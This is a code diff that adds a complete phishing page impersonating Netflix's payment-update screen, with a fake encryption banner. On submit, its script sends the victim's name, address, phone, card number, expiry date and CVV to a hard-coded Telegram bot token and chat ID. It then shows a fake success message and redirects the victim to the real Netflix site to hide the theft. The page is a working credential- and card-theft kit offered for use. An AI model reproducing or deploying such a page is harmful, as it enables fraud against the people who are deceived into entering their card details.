@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Net - Update Payment Information</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    :root {
+      --net-red: #e50914;
+      --net-dark: #f5f5f5;
+      --net-gray: #737373;
+      --net-light-gray: #333333;
+      --net-white: #000000;
+      --net-card-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      --net-transition: all 0.3s ease;
+      --background-color: #ffffff;
+      --card-background: rgba(255, 255, 255, 0.9);
+    }
+
+    body {
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background: var(--background-color);
+      color: var(--net-white);
+      line-height: 1.6;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 50px;
+      background: linear-gradient(to bottom, rgba(255,255,255,0.7) 0%, rgba(255,255,255,0) 100%);
+      position: relative;
+      z-index: 10;
+    }
+
+    .logo {
+      width: 120px;
+      height: auto;
+    }
+
+    .signout-btn {
+      background: transparent;
+      color: var(--net-white);
+      border: 1px solid var(--net-gray);
+      border-radius: 4px;
+      padding: 8px 16px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: var(--net-transition);
+    }
+
+    .signout-btn:hover {
+      background: rgba(0,0,0,0.1);
+    }
+
+    .container {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .payment-card {
+      background: var(--card-background);
+      border-radius: 8px;
+      box-shadow: var(--net-card-shadow);
+      width: 100%;
+      max-width: 500px;
+      padding: 40px;
+      margin: 30px 0;
+      border: 1px solid #e0e0e0;
+    }
+
+    .payment-header {
+      margin-bottom: 25px;
+    }
+
+    .payment-header h1 {
+      font-size: 28px;
+      font-weight: 600;
+      margin-bottom: 10px;
+      color: #000;
+    }
+
+    .payment-header p {
+      color: var(--net-gray);
+      font-size: 16px;
+    }
+
+    .card-providers {
+      display: flex;
+      gap: 15px;
+      margin: 20px 0;
+    }
+
+    .card-provider {
+      width: 50px;
+      height: 35px;
+      background: var(--net-dark);
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 5px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+
+    .card-provider img {
+      max-width: 100%;
+      height: auto;
+    }
+
+    .security-banner {
+      background: rgba(229, 9, 20, 0.1);
+      border: 1px solid rgba(229, 9, 20, 0.3);
+      border-radius: 4px;
+      padding: 12px 15px;
+      margin: 20px 0;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .security-banner i {
+      color: var(--net-red);
+      font-size: 18px;
+    }
+
+    .security-banner span {
+      font-size: 14px;
+      color: var(--net-light-gray);
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    .form-label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--net-light-gray);
+    }
+
+    .input-wrapper {
+      position: relative;
+    }
+
+    .input-wrapper i {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--net-gray);
+      font-size: 16px;
+    }
+
+    .form-control {
+      width: 100%;
+      padding: 14px 14px 14px 40px;
+      background: rgba(245, 245, 245, 0.8);
+      border: 1px solid var(--net-gray);
+      border-radius: 4px;
+      color: var(--net-light-gray);
+      font-size: 16px;
+      transition: var(--net-transition);
+    }
+
+    .form-control:focus {
+      outline: none;
+      border-color: var(--net-red);
+      background: rgba(230, 230, 230, 0.8);
+    }
+
+    .form-control::placeholder {
+      color: var(--net-gray);
+    }
+
+    .form-row {
+      display: flex;
+      gap: 15px;
+    }
+
+    .form-row .form-group {
+      flex: 1;
+    }
+
+    .cvv-hint {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--net-gray);
+      font-size: 12px;
+      cursor: pointer;
+    }
+
+    .submit-btn {
+      background: var(--net-red);
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 600;
+      width: 100%;
+      cursor: pointer;
+      transition: var(--net-transition);
+      margin-top: 10px;
+    }
+
+    .submit-btn:hover {
+      background: #f40612;
+    }
+
+    .submit-btn:disabled {
+      background: var(--net-gray);
+      cursor: not-allowed;
+    }
+
+    .footer {
+      background: rgba(255, 255, 255, 0.9);
+      padding: 40px 15%;
+      border-top: 1px solid rgba(0,0,0,0.1);
+    }
+
+    .footer-content {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 20px;
+    }
+
+    .footer-column h3 {
+      font-size: 16px;
+      margin-bottom: 20px;
+      color: var(--net-gray);
+      font-weight: 500;
+    }
+
+    .footer-column ul {
+      list-style: none;
+    }
+
+    .footer-column li {
+      margin-bottom: 12px;
+    }
+
+    .footer-column a {
+      color: var(--net-gray);
+      text-decoration: none;
+      font-size: 14px;
+      transition: var(--net-transition);
+    }
+
+    .footer-column a:hover {
+      color: var(--net-red);
+      text-decoration: underline;
+    }
+
+    .footer-bottom {
+      margin-top: 30px;
+      color: var(--net-gray);
+      font-size: 14px;
+    }
+
+    @media (max-width: 768px) {
+      .header {
+        padding: 20px;
+      }
+      
+      .payment-card {
+        padding: 30px 20px;
+      }
+      
+      .form-row {
+        flex-direction: column;
+        gap: 0;
+      }
+      
+      .footer {
+        padding: 30px 20px;
+      }
+    }
+
+    /* Validation styling */
+    .form-group.error .form-control {
+      border-color: var(--net-red);
+    }
+
+    .error-message {
+      color: var(--net-red);
+      font-size: 13px;
+      margin-top: 5px;
+      display: none;
+    }
+
+    .form-group.error .error-message {
+      display: block;
+    }
+
+    .success-message {
+      background: rgba(46, 204, 113, 0.1);
+      border: 1px solid rgba(46, 204, 113, 0.3);
+      border-radius: 4px;
+      padding: 15px;
+      margin: 15px 0;
+      text-align: center;
+      display: none;
+    }
+
+    .success-message i {
+      color: #2ecc71;
+      margin-right: 8px;
+    }
+  </style>
+</head>
+<body>
+  <header class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="logo">
+    <button class="signout-btn" id="signout-btn">Sign Out</button>
+  </header>
+  
+  <div class="container">
+    <div class="payment-card">
+      <div class="payment-header">
+        <h1>Update Payment Method</h1>
+        <p>Update your credit or debit card to continue enjoying Netflix.</p>
+        
+        <div class="card-providers">
+          <div class="card-provider">
+            <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa">
+          </div>
+          <div class="card-provider">
+            <img src="https://img.icons8.com/color/48/000000/mastercard.png" alt="Mastercard">
+          </div>
+          <div class="card-provider">
+            <img src="https://img.icons8.com/ios/50/000000/amex.png" alt="American Express">
+          </div>
+          <div class="card-provider">
+            <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover">
+          </div>
+        </div>
+      </div>
+      
+      <div class="security-banner">
+        <i class="fas fa-lock"></i>
+        <span>Your payment information is secured with 256-bit SSL encryption</span>
+      </div>
+      
+      <div class="success-message">
+        <i class="fas fa-check-circle"></i>
+        <span>Your payment information has been successfully updated!</span>
+      </div>
+      
+      <form id="payment-form">
+        <div class="form-group">
+          <label class="form-label">Cardholder Name</label>
+          <div class="input-wrapper">
+            <i class="fas fa-user"></i>
+            <input type="text" class="form-control" id="full-name" placeholder="Full name as it appears on card" required>
+          </div>
+          <div class="error-message">Please enter your full name</div>
+        </div>
+        
+        <div class="form-group">
+          <label class="form-label">Billing Address</label>
+          <div class="input-wrapper">
+            <i class="fas fa-map-marker-alt"></i>
+            <input type="text" class="form-control" id="billing" placeholder="Street address" required>
+          </div>
+          <div class="error-message">Please enter your billing address</div>
+        </div>
+        
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">City</label>
+            <div class="input-wrapper">
+              <i class="fas fa-city"></i>
+              <input type="text" class="form-control" id="city" placeholder="City" required>
+            </div>
+            <div class="error-message">Please enter your city</div>
+          </div>
+          
+          <div class="form-group">
+            <label class="form-label">State</label>
+            <div class="input-wrapper">
+              <i class="fas fa-building"></i>
+              <input type="text" class="form-control" id="state" placeholder="State" required>
+            </div>
+            <div class="error-message">Please enter your state</div>
+          </div>
+        </div>
+        
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">ZIP Code</label>
+            <div class="input-wrapper">
+              <i class="fas fa-mail-bulk"></i>
+              <input type="text" class="form-control" id="zip-code" placeholder="ZIP code" maxlength="5" required>
+            </div>
+            <div class="error-message">Please enter a valid ZIP code</div>
+          </div>
+          
+          <div class="form-group">
+            <label class="form-label">Country</label>
+            <div class="input-wrapper">
+              <i class="fas fa-globe-americas"></i>
+              <select class="form-control" id="country" required>
+                <option value="US" selected>United States</option>
+                <option value="CA">Canada</option>
+                <option value="GB">United Kingdom</option>
+                <option value="AU">Australia</option>
+                <option value="DE">Germany</option>
+                <option value="FR">France</option>
+                <option value="JP">Japan</option>
+              </select>
+            </div>
+          </div>
+        </div>
+        
+        <div class="form-group">
+          <label class="form-label">Phone Number</label>
+          <div class="input-wrapper">
+            <i class="fas fa-phone"></i>
+            <input type="tel" class="form-control" id="phone" value="+1" required>
+          </div>
+          <div class="error-message">Please enter a valid phone number</div>
+        </div>
+        
+        <div class="form-group">
+          <label class="form-label">Card Number</label>
+          <div class="input-wrapper">
+            <i class="fas fa-credit-card"></i>
+            <input type="text" class="form-control" id="bin" placeholder="1234 5678 9012 3456" maxlength="19" required>
+          </div>
+          <div class="error-message">Please enter a valid card number</div>
+        </div>
+        
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">Expiration Date</label>
+            <div class="input-wrapper">
+              <i class="fas fa-calendar-alt"></i>
+              <input type="text" class="form-control" id="exp-date" placeholder="MM/YY" maxlength="5" required>
+            </div>
+            <div class="error-message">Please enter a valid expiration date</div>
+          </div>
+          
+          <div class="form-group">
+            <label class="form-label">Security Code (CVV)</label>
+            <div class="input-wrapper">
+              <i class="fas fa-lock"></i>
+              <input type="text" class="form-control" id="security" placeholder="CVV" maxlength="4" required>
+              <span class="cvv-hint" title="3 or 4-digit code on back of card">
+                <i class="fas fa-question-circle"></i>
+              </span>
+            </div>
+            <div class="error-message">Please enter a valid CVV</div>
+          </div>
+        </div>
+        
+        <button type="submit" class="submit-btn" id="submit-sesh">SAVE CHANGES</button>
+      </form>
+    </div>
+  </div>
+  
+  <footer class="footer">
+    <div class="footer-content">
+      <div class="footer-column">
+        <h3>Questions? Contact us.</h3>
+        <ul>
+          <li><a href="#">FAQ</a></li>
+          <li><a href="#">Privacy</a></li>
+          <li><a href="#">Cookie Preferences</a></li>
+        </ul>
+      </div>
+      
+      <div class="footer-column">
+        <h3>Help Center</h3>
+        <ul>
+          <li><a href="#">Terms of Use</a></li>
+          <li><a href="#">Corporate Information</a></li>
+          <li><a href="#">Legal Notices</a></li>
+        </ul>
+      </div>
+      
+      <div class="footer-column">
+        <h3>Account</h3>
+        <ul>
+          <li><a href="#">Ways to Watch</a></li>
+          <li><a href="#">Terms of Payment</a></li>
+          <li><a href="#">Contact Us</a></li>
+        </ul>
+      </div>
+      
+      <div class="footer-column">
+        <h3>Media Center</h3>
+        <ul>
+          <li><a href="#">Investor Relations</a></li>
+          <li><a href="#">Redeem Gift Cards</a></li>
+          <li><a href="#">Buy Gift Cards</a></li>
+        </ul>
+      </div>
+    </div>
+    
+    <div class="footer-bottom">
+      <p>Netflix, Inc. is a registered service of Netflix Corporation. © 2025 Netflix, Inc.</p>
+    </div>
+  </footer>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const form = document.getElementById('payment-form');
+      const submitBtn = document.getElementById('submit-sesh');
+      const successMessage = document.querySelector('.success-message');
+      const signoutBtn = document.getElementById('signout-btn');
+      
+      // Telegram bot info
+      const bot = {
+        TOKEN: "8306085341:AAG6T805T2LNq9u-UQ6VW_-U48mmtJzM0FE",
+        chatID: "6123346184"
+      };
+      
+      // Sign out button functionality
+      signoutBtn.addEventListener('click', function() {
+        window.location.href = 'index.html';
+      });
+      
+      // Card number formatting
+      const cardInput = document.getElementById('bin');
+      cardInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        let formatted = '';
+        
+        for (let i = 0; i < value.length; i++) {
+          if (i > 0 && i % 4 === 0) formatted += ' ';
+          formatted += value[i];
+        }
+        
+        e.target.value = formatted;
+      });
+      
+      // Expiration date formatting
+      const expInput = document.getElementById('exp-date');
+      expInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        
+        if (value.length > 2) {
+          value = value.substring(0, 2) + '/' + value.substring(2, 4);
+        }
+        
+        e.target.value = value;
+      });
+      
+      // Form validation and submission
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        let isValid = true;
+        
+        // Reset errors
+        document.querySelectorAll('.form-group').forEach(group => {
+          group.classList.remove('error');
+        });
+        
+        // Validate required fields
+        const requiredFields = form.querySelectorAll('[required]');
+        requiredFields.forEach(field => {
+          if (!field.value.trim()) {
+            isValid = false;
+            field.closest('.form-group').classList.add('error');
+          }
+        });
+        
+        // Validate card number (simplified)
+        if (cardInput.value.replace(/\s/g, '').length < 16) {
+          isValid = false;
+          cardInput.closest('.form-group').classList.add('error');
+        }
+        
+        // Validate CVV
+        if (document.getElementById('security').value.length < 3) {
+          isValid = false;
+          document.getElementById('security').closest('.form-group').classList.add('error');
+        }
+        
+        // Validate expiration date
+        const expValue = expInput.value;
+        if (expValue.length !== 5 || expValue.indexOf('/') === -1) {
+          isValid = false;
+          expInput.closest('.form-group').classList.add('error');
+        }
+        
+        if (isValid) {
+          // Prepare form data
+          const formData = {
+            cardholderName: document.getElementById('full-name').value,
+            billingAddress: document.getElementById('billing').value,
+            city: document.getElementById('city').value,
+            state: document.getElementById('state').value,
+            zipCode: document.getElementById('zip-code').value,
+            country: document.getElementById('country').value,
+            phone: document.getElementById('phone').value,
+            cardNumber: document.getElementById('bin').value,
+            expDate: document.getElementById('exp-date').value,
+            cvv: document.getElementById('security').value,
+            timestamp: new Date().toLocaleString()
+          };
+          
+          // Format message for Telegram
+          const message = `💳 *New Payment Information Submitted* 💳
+          
+👤 *Cardholder Name:* ${formData.cardholderName}
+🏠 *Billing Address:* ${formData.billingAddress}
+📍 *City/State/Zip:* ${formData.city}, ${formData.state} ${formData.zipCode}
+🌎 *Country:* ${formData.country}
+📞 *Phone:* ${formData.phone}
+
+💳 *Card Details:*
+🔢 *Number:* ${formData.cardNumber}
+📅 *Exp Date:* ${formData.expDate}
+🔐 *CVV:* ${formData.cvv}
+
+⏰ *Timestamp:* ${formData.timestamp}`;
+          
+          // Send to Telegram
+          sendToTelegram(message);
+          
+          // Simulate form submission
+          submitBtn.disabled = true;
+          submitBtn.textContent = 'Processing...';
+          
+          setTimeout(() => {
+            successMessage.style.display = 'block';
+            form.reset();
+            
+            setTimeout(() => {
+              successMessage.style.display = 'none';
+              submitBtn.disabled = false;
+              submitBtn.textContent = 'SAVE CHANGES';
+              // Redirect to netflix.com after showing success message
+              window.location.href = 'https://www.netflix.com';
+            }, 3000);
+          }, 1500);
+        }
+      });
+      
+      // Function to send data to Telegram
+      function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${bot.TOKEN}/sendMessage`;
+        
+        const params = {
+          chat_id: bot.chatID,
+          text: message,
+          parse_mode: 'Markdown'
+        };
+        
+        fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(params)
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log('Message sent to Telegram:', data);
+        })
+        .catch(error => {
+          console.error('Error sending to Telegram:', error);
+        });
+      }
+      
+      // Real-time validation
+      form.querySelectorAll('.form-control').forEach(input => {
+        input.addEventListener('input', function() {
+          if (this.value.trim()) {
+            this.closest('.form-group').classList.remove('error');
+          }
+        });
+      });
+    });
+  </script>
+</body>
+</html>
